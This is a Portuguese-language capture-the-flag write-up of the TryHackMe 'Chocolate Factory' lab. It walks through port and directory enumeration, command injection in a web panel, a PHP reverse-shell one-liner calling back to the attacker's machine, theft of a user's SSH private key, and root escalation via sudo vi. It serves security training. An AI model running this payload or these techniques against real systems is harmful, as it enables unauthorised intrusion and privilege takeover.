---
title: "Chocolate Factory"
date: 2026-04-26
summary: "Injeção de comandos, reverse shell em PHP, acesso por SSH e escalada de privilégios com vi."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["Command Injection", "PHP", "SSH", "Sudo"]
draft: false
---

## Visão Geral

A máquina apresenta um cenário de enumeração de portas, exploração de injeção de comandos
web (*Command Injection*) e escalada de privilégios em ambiente Linux, com o objetivo
final de coletar as flags de usuário e root.

A superfície de ataque inicial explorada consistiu na descoberta de uma porta que hospedava
uma dica para o download de um arquivo misterioso, do qual uma chave criptográfica
(*key*) foi extraída, além da identificação de um painel de comandos vulnerável na
página `home.php`. Após o acesso, a exploração seguiu para a obtenção de uma
*reverse shell* em PHP através do painel vulnerável, o que permitiu o acesso ao
código-fonte de parte da aplicação (`validate.php`) e a transição para um acesso
persistente via roubo de uma chave privada SSH do usuário `charlie`. Por fim, a
escalada de privilégios para root foi garantida pela exploração de uma configuração insegura
do `sudo` atrelada ao editor de texto `vi`, permitindo a execução de um shell
de superusuário para descriptografar e coletar a flag final.

## Reconhecimento

Inicialmente, foi realizada uma varredura utilizando o **Nmap**. Foram encontradas diversas
portas abertas e, ao interagir com cada uma delas, o servidor retornava mensagens distintas
sobre possuir ou não algo útil. Em uma dessas portas, identificou-se uma referência direta
indicando onde a *key* poderia ser encontrada.

```bash
nmap -sC -sV -v -T4 <TARGET_IP>
```

Ao acessar a página indicada, um arquivo foi baixado automaticamente. Na tentativa de
descobrir a natureza desse artefato, utilizou-se o utilitário `file`:

```bash
file <ARCHIVE_NAME>
```

Para extrair informações legíveis, empregou-se o comando `strings`, o qual revelou com
sucesso a chave (*key*) oculta em seu conteúdo:

```bash
strings <ARCHIVE_NAME>
```

Paralelamente, executou-se o **Feroxbuster** para força bruta de diretórios, o que resultou
na descoberta da página oculta `home.php`:

```bash
feroxbuster -u http://target.com \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt,js
```

![Varredura de portas com Nmap mostrando dica sobre a key.](/images/writeups/chocolate-factory/nmap_revkey.png)

![Extração da key do arquivo baixado utilizando o comando strings.](/images/writeups/chocolate-factory/key.png)

![Resultado da varredura do Feroxbuster.](/images/writeups/chocolate-factory/feroxbuster.png)

## Exploração

Na página `home.php` descoberta pelo Feroxbuster, identificou-se um painel que permitia
inserir comandos, simulando um terminal Linux. A inserção do comando `ls` revelou
diversos arquivos com extensão `.php`, confirmando a vulnerabilidade de execução remota de comandos
(*Remote Code Execution*).

A estratégia adotada foi testar um *payload* de *reverse shell* em PHP.
O Netcat foi configurado localmente para escutar na porta 1234 e o seguinte comando foi
executado no painel vulnerável:

```php
php -r '$sock=fsockopen("<MY_MACHINE_IP>",<LISTENING_PORT>);
exec("/bin/sh -i <&3 >&3 2>&3");'
```

O terminal da shell abriu no diretório base do servidor web (`/var/www/html`).
A listagem dos arquivos com `ls` permitiu a identificação do arquivo `validate.php`.
A leitura de seu conteúdo por meio do comando `cat` expôs um script de validação
que continha o nome de usuário aceito na aplicação: `charlie`.

Durante a exploração do sistema no diretório `/home/charlie`, localizou-se uma chave privada
SSH. O conteúdo foi copiado para a máquina local e as permissões do arquivo foram ajustadas:

```bash
chmod 600 id_rsa
ssh -i id_rsa charlie@<TARGET_IP>
```

Com essa chave, o login via SSH como `charlie` foi bem-sucedido, garantindo a
visualização da flag de usuário:

```bash
cat user.txt
[flag omitida para evitar spoilers]
```

![Painel web usado para injeção de comandos.](/images/writeups/chocolate-factory/homephp.png)

![Acesso à reverse shell com Netcat.](/images/writeups/chocolate-factory/netcat.png)

## Escalada de Privilégios

Com o acesso estável via SSH, tornou-se necessário elevar os privilégios para buscar a flag root.
A execução do comando `sudo -l` revelou que as permissões do `sudo` estavam
mal configuradas: o sistema permitia que o usuário `charlie` rodasse o editor de texto
`vi` com privilégios de qualquer usuário, incluindo o root, sem exigir senha.

```bash
sudo -l
# (ALL : !root) NOPASSWD: /usr/bin/vi
```

Para a obtenção de acesso total, executou-se `sudo vi`. O editor `vi` possui a capacidade
de invocar comandos do sistema subjacente. A inserção do comando `:!bash` dentro da interface do
editor acionou a abertura de um terminal interativo executando como root:

```text
:!bash
```

Com privilégio máximo, a navegação até o diretório `/root` revelou o script `root.py`.
Durante sua execução, o script solicitou um *input*. A inserção da *key* descoberta
na fase de reconhecimento resultou na descriptografia de uma mensagem oculta e na revelação da flag root:

```bash
cd /root
ls
# root.py
python3 root.py
# [key obtida no reconhecimento — omitida para evitar spoilers]
# [flag omitida para evitar spoilers]
```

![Verificação de privilégios `sudo -l` mostrando o `vi`.](/images/writeups/chocolate-factory/sudo-l.png)

## Conclusão

A invasão da máquina dependeu da enumeração de portas e diretórios, que revelou uma
*key* essencial em um arquivo escondido e expôs uma página com falha de injeção de
comandos web. O estabelecimento de uma *reverse shell* via *payload* PHP foi
crucial para o acesso inicial ao servidor. A exploração interna levou ao encontro de uma
chave SSH, e a escalada de privilégios baseou-se no abuso de uma configuração vulnerável do
`sudo` associada ao `vi`.

O cenário demonstra o alto risco de expor painéis de comandos sem sanitização adequada e os
perigos da distribuição incorreta de permissões de superusuário em ambientes Linux.

## Referências

- PentestMonkey. *Reverse Shell Cheat Sheet*. Disponível em: <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>.
- GTFOBins. *vi -- GTFOBins*. Disponível em: <https://gtfobins.github.io/gtfobins/vi/>.
